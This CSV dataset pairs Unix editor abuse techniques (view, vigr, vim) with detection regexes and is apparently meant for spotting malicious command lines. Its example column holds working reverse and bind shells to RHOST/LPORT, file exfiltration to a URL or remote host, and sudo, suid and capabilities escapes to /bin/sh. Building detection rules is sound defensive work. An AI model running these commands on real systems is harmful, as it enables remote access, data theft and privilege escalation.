"Name","Function","ExampleCode","RegexStrictV8","Notes"
"view","non-interactive-reverse-shell","view -c ':lua local s=require(""socket""); local t=assert(s.tcp());
  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,""r""));
    local b=assert(f:read(""*a""));t:send(b);
  end;
  f:close();t:close();'","(?i)\b(?:\S*/)?view\b.*require\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*assert\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*connect\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*))\s*\).*receive\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*assert\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*assert\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*send\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close.*\-c",""
"view","non-interactive-bind-shell","view -c ':lua local k=require(""socket"");
  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,""r""));
    local b=assert(f:read(""*a""));c:send(b);
  end;c:close();f:close();'","(?i)\b(?:\S*/)?view\b.*require\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*assert\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*accept\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*receive\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*assert\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*assert\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*send\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close.*\-c",""
"view","file-upload","view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
vim.command("":q!"")'","(?i)\b(?:\S*/)?view\b.*urlopen\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*read\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*encode\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*command\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*\-c",""
"view","file-upload","view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command("":q!"")'","(?i)\b(?:\S*/)?view\b.*TCPServer\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*serve_forever\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*command\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*\-c",""
"view","file-upload","view -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')
  local d=f:read(""*a"")
  io.close(f);
  local s=require(""socket"");
  local t=assert(s.tcp());
  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
  t:send(d);
  t:close();'","(?i)\b(?:\S*/)?view\b.*open\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*read\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*require\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*assert\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*connect\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*))\s*\).*send\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close.*\-c",""
"view","file-download","view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])
vim.command("":q!"")'","(?i)\b(?:\S*/)?view\b.*urlretrieve\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*command\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*\-c",""
"view","file-download","view -c ':lua local k=require(""socket"");
  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
  local c=s:accept();
  local d,x=c:receive(""*a"");
  c:close();
  local f=io.open(os.getenv(""LFILE""), ""wb"");
  f:write(d);
  io.close(f);'","(?i)\b(?:\S*/)?view\b.*require\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*assert\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*accept\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*receive\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*open\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*write\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close.*\-c",""
"view","file-write","view file_to_write
iDATA
^[
w!","(?i)\b(?:\S*/)?view\b.*.+",""
"view","file-read","view file_to_read","(?i)\b(?:\S*/)?view\b.*.+",""
"view","library-load","view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'","(?i)\b(?:\S*/)?view\b.*LoadLibrary\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*command\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*\-c",""
"view","suid","./view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'","(?i)\b(?:\S*/)?view\b.*execl\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh.*\-c",""
"view","sudo","sudo view -c ':!/bin/sh'","(?i)\b(?:\S*/)?sudo\b.*/bin/sh.*\-c",""
"view","sudo","sudo view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","(?i)\b(?:\S*/)?sudo\b.*execl\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh.*\-c",""
"view","sudo","sudo view -c ':lua os.execute(""reset; exec sh"")'","(?i)\b(?:\S*/)?sudo\b.*execute\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*\-c",""
"view","capabilities","./view -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","(?i)\b(?:\S*/)?view\b.*setuid\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*execl\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh.*\-c",""
"view","limited-suid","./view -c ':lua os.execute(""reset; exec sh"")'","(?i)\b(?:\S*/)?view\b.*execute\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*\-c",""
"vigr","suid","./vigr","(?i)\b(?:\S*/)?vigr\b.*.+",""
"vigr","sudo","sudo vigr","(?i)\b(?:\S*/)?sudo\b.*.+",""
"vim","shell","vim -c ':!/bin/sh'","(?i)\b(?:\S*/)?vim\b.*/bin/sh.*\-c",""
"vim","shell","vim --cmd ':set shell=/bin/sh|:shell'","(?i)\b(?:\S*/)?vim\b.*/bin/sh.*\-c",""
"vim","shell","vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","(?i)\b(?:\S*/)?vim\b.*execl\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh.*\-c",""
"vim","shell","vim -c ':lua os.execute(""reset; exec sh"")'","(?i)\b(?:\S*/)?vim\b.*execute\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*\-c",""
